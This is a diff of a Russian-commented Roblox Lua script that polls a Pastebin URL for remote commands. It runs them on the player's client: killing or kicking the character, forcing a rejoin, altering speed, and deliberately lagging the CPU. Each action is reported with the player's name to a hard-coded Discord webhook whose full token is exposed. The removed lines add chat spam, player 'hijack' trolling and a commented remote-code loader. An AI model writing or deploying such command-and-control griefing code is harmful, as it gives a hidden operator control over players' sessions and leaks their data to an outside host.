@@ -1,157 +1,85 @@
--- Настройки подключения
-local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1465626358351794206/Vd6C9UGjjUhiH5xUdy1rv2AbwPwRqQIHrozSDyW1a0k5VoNd2k_-d2U3PgurZVkRMbl0"
-local PASTEBIN_URL = "https://pastebin.com/raw/VfCXKNdB" -- Ссылка на настройки
-
--- Сервисы
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
-local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 
-local LocalPlayer = Players.LocalPlayer
-local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-local Humanoid = Character:WaitForChild("Humanoid")
+-- Настройки
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1465626358351794206/Vd6C9UGjjUhiH5xUdy1rv2AbwPwRqQIHrozSDyW1a0k5VoNd2k_-d2U3PgurZVkRMbl0"
+local PASTEBIN_URL = "https://pastebin.com/raw/VfCXKNdB"
 
--- Функция логирования в Discord
-local function logToDiscord(action, details)
+local lastCommand = "" -- Чтобы не повторять одно и то же
+local LocalPlayer = Players.LocalPlayer
+
+-- Функция отправки логов в Discord
+local function logToDiscord(action)
     local data = {
-        ["content"] = "",
         ["embeds"] = {{
-            ["title"] = "Admin Log: " .. action,
-            ["description"] = "Игрок: " .. LocalPlayer.Name .. "\nДетали: " .. (details or "Нет"),
-            ["color"] = 16711680 -- Красный цвет
+            ["title"] = "🚀 Команда исполнена",
+            ["description"] = "**Действие:** " .. action .. "\n**Игрок:** " .. LocalPlayer.Name,
+            ["color"] = 0x00ff00
         }}
     }
     pcall(function()
-        HttpService:PostAsync(DISCORD_WEBHOOK_URL, HttpService:JSONEncode(data))
+        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data))
     end)
 end
 
--- Загрузка внешнего конфига (Pastebin)
-task.spawn(function()
-    local success, result = pcall(function()
+-- Система команд
+local Commands = {
+    ["kill"] = function() LocalPlayer.Character.Humanoid.Health = 0 end,
+    ["rejoin"] = function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end,
+    ["fire"] = function() Instance.new("Fire", LocalPlayer.Character.HumanoidRootPart).Name = "TempFire" end,
+    ["unfire"] = function() 
+        local f = LocalPlayer.Character.HumanoidRootPart:FindFirstChild("TempFire")
+        if f then f:Destroy() end
+    end,
+    ["darktime"] = function()
+        game.Lighting.Brightness = 0
+        task.wait(5)
+        game.Lighting.Brightness = 2
+    end,
+    ["lag"] = function()
+        _G.Lagging = true
+        task.spawn(function()
+            while _G.Lagging do 
+                for i=1, 1000000 do local a = i * i end
+                task.wait()
+            end
+        end)
+    end,
+    ["unlag"] = function() _G.Lagging = false end
+}
+
+-- Главный цикл проверки Pastebin
+print("System Started. Waiting for commands from Pastebin...")
+
+while true do
+    local success, currentCommand = pcall(function()
         return game:HttpGet(PASTEBIN_URL)
     end)
-    if success then
-        print("External commands loaded")
-        -- loadstring(result)() -- Раскомментируй, если в Pastebin лежит исполняемый код
-    end
-end)
 
--- ПЕРЕМЕННЫЕ СОСТОЯНИЯ
-local spamLoop = false
-local lagLoop = nil
-local hijackConnection = nil
+    if success and currentCommand ~= lastCommand then
+        lastCommand = currentCommand
+        
+        -- Анализ команды (например: speed 50 или kill)
+        local args = string.split(currentCommand, " ")
+        local cmdName = args[1]:lower()
+        local val = args[2]
 
--- ФУНКЦИИ УПРАВЛЕНИЯ
-local Commands = {}
-
--- 1. Управление жизнью
-function Commands.kill()
-    Humanoid.Health = 0
-    logToDiscord("Kill", "Персонаж обнулен")
-end
-
-function Commands.kick(reason)
-    logToDiscord("Kick", "Причина: " .. reason)
-    LocalPlayer:Kick(reason)
-end
-
-function Commands.rejoin()
-    logToDiscord("Rejoin", "Перезаход на сервер")
-    TeleportService:Teleport(game.PlaceId, LocalPlayer)
-end
-
-function Commands.tp_to(targetName)
-    local target = Players:FindFirstChild(targetName)
-    if target and target.Character then
-        Character:MoveTo(target.Character.HumanoidRootPart.Position)
-        logToDiscord("TP", "Телепорт к " .. targetName)
-    end
-end
-
--- 2. Параметры персонажа
-function Commands.speed(value)
-    Humanoid.WalkSpeed = value
-end
-
-function Commands.jump(value)
-    Humanoid.JumpPower = value
-end
-
-function Commands.fire()
-    local f = Instance.new("Fire", Character.HumanoidRootPart)
-    f.Name = "EffectFire"
-end
-
-function Commands.unfire()
-    if Character.HumanoidRootPart:FindFirstChild("EffectFire") then
-        Character.HumanoidRootPart.EffectFire:Destroy()
-    end
-end
-
--- 3. Эффекты
-function Commands.message(text)
-    local gui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
-    local txt = Instance.new("TextLabel", gui)
-    txt.Size = UDim2.new(1, 0, 1, 0)
-    txt.BackgroundTransparency = 1
-    txt.TextColor3 = Color3.new(1, 0, 0)
-    txt.TextScaled = true
-    txt.Text = text
-    logToDiscord("Message", text)
-    task.wait(5)
-    gui:Destroy()
-end
-
-function Commands.lag()
-    lagLoop = RunService.Heartbeat:Connect(function()
-        for i = 1, 1000000 do -- Искусственная нагрузка
-            local _ = math.sqrt(i)
+        if Commands[cmdName] then
+            Commands[cmdName]()
+            logToDiscord(currentCommand)
+        elseif cmdName == "speed" then
+            LocalPlayer.Character.Humanoid.WalkSpeed = tonumber(val) or 16
+            logToDiscord("Установлена скорость: " .. val)
+        elseif cmdName == "jump" then
+            LocalPlayer.Character.Humanoid.JumpPower = tonumber(val) or 50
+            logToDiscord("Прыжок изменен: " .. val)
+        elseif cmdName == "kick" then
+            logToDiscord("Кикнут с причиной: " .. (val or "None"))
+            LocalPlayer:Kick(val)
         end
-    end)
-    logToDiscord("Lag", "Активирована нагрузка ЦП")
-end
-
-function Commands.unlag()
-    if lagLoop then lagLoop:Disconnect() end
-end
-
--- 4. Троллинг
-function Commands.hijack(targetName)
-    local target = Players:FindFirstChild(targetName)
-    if target and target.Character then
-        hijackConnection = RunService.RenderStepped:Connect(function()
-            Character:MoveTo(target.Character.HumanoidRootPart.Position + Vector3.new(2, 0, 2))
-        end)
-        logToDiscord("Hijack", "Слежка за " .. targetName)
     end
-end
 
-function Commands.unhijack()
-    if hijackConnection then hijackConnection:Disconnect() end
+    task.wait(2) -- Проверка каждые 2 секунды, чтобы Roblox не забанил за частые запросы
 end
-
-function Commands.chat_spam(text)
-    spamLoop = true
-    logToDiscord("Spam", "Начат спам: " .. text)
-    task.spawn(function()
-        while spamLoop do
-            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
-            task.wait(0.1)
-        end
-    end)
-end
-
-function Commands.stop_spam()
-    spamLoop = false
-end
-
--- Режим Safe
-function Commands.safe()
-    print("System in standby mode...")
-end
-
--- Пример использования:
--- Commands.speed(100)
--- Commands.message("ВНИМАНИЕ!")
